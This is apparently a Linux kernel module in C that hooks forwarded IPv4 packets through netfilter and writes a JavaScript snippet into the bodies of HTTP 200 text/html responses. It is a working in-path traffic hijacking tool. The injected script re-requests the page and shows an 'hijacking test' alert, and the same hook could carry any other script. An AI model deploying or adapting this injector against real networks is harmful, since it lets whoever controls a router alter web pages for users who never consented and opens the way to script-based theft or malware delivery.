#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <net/ip.h>
#include <net/tcp.h>
#include <linux/if_packet.h>
#include <linux/skbuff.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("songboyu");
MODULE_DESCRIPTION("modify http payload, base on netfilter");
MODULE_VERSION("1.0");
// if (window.ActiveXObject) {
// 	ajax = new ActiveXObject('Microsoft.XMLHTTP');
// } else if (window.XMLHttpRequest) {
// 	ajax = new XMLHttpRequest();
// }
char code[] = "<script>" \
"var ajax = new XMLHttpRequest();" \
"ajax.open('GET', window.location.href, false);" \
"ajax.setRequestHeader('Range', 'bytes=0-%d');" \
"ajax.onreadystatechange = function() {" \
	"if ((ajax.readyState == 4) && (ajax.status == 206)) {" \
	"	document.write(ajax.responseText);" \
	"}" \
"};" \
"ajax.send(null);" \
"alert('hijacking test');" \
"</script>";

unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
	int codeLen = strlen(code);
	// IP数据包frag合并
	if (0 != skb_linearize(skb)) {
		return NF_ACCEPT;
	}
	struct iphdr *iph = ip_hdr(skb);

	unsigned int tot_len = ntohs(iph->tot_len);
	unsigned int iph_len = ip_hdrlen(skb);

	// unsigned int saddr = (unsigned int)iph->saddr;
	// unsigned int daddr = (unsigned int)iph->daddr;

	if (iph->protocol == IPPROTO_TCP)
	{	
		struct tcphdr *tcph = (void *)iph + iph->ihl * 4;
		// struct tcphdr *tcph = tcp_hdr(skb);
		// unsigned int tcplen = skb->len - (iph->ihl*4) - (tcph->doff*4);

		unsigned int sport = (unsigned int)ntohs(tcph->source);
		unsigned int dport = (unsigned int)ntohs(tcph->dest);

		char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));

		// printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &saddr, sport, &daddr, dport);
		// 接收到的数据包
		if (sport == 80)
		{

			// 处理HTTP请求且请求返回200
			if (memcmp(pkg,"HTTP/1.1 200", 12) == 0 || memcmp(pkg,"HTTP/1.0 200", 12) == 0)
			{
				char* p,*p1;

				p = strstr(pkg,"Content-Type: text/html");
				if(p == NULL)	return NF_ACCEPT;
				
				p = strstr(pkg,"Content-Encoding: deflate");
				if(p != NULL){
					printk("deflate\n");
				}
				p = strstr(pkg,"<html");
				if(p == NULL)	return NF_ACCEPT;
				                       
				p = strstr(pkg,"\r\n\r\n");
				if(p == NULL)	return NF_ACCEPT;
				
				p += 4;

				char s[codeLen+4];
				if(codeLen < (1000-2)){
					snprintf(s, codeLen+2, code, codeLen+1);
				}else if(codeLen < (10000-2) && codeLen >= (1000-2)){
					snprintf(s, codeLen+3, code, codeLen+2);
				}
				// printk("%s\n", s);
				memcpy(p, s, strlen(s));
			}
		}
	}
	return NF_ACCEPT;
}

// 钩子函数注册
static struct nf_hook_ops http_hooks[] = {
	{
		.hook 			= hook_func,
		.pf 			= NFPROTO_IPV4,
		.hooknum 		= NF_INET_FORWARD, 
		.priority 		= NF_IP_PRI_MANGLE,
		.owner			= THIS_MODULE
	}
};

// 模块加载
static int init_hook_module(void)
{
	nf_register_hooks(http_hooks, ARRAY_SIZE(http_hooks));
	printk(KERN_ALERT "hook_ipv4: insmod\n");

	return 0;
}

// 模块卸载
static void cleanup_hook_module(void)
{
	nf_unregister_hooks(http_hooks, ARRAY_SIZE(http_hooks));
	printk(KERN_ALERT "hook_ipv4: rmmod\n");
}

module_init(init_hook_module);
module_exit(cleanup_hook_module);
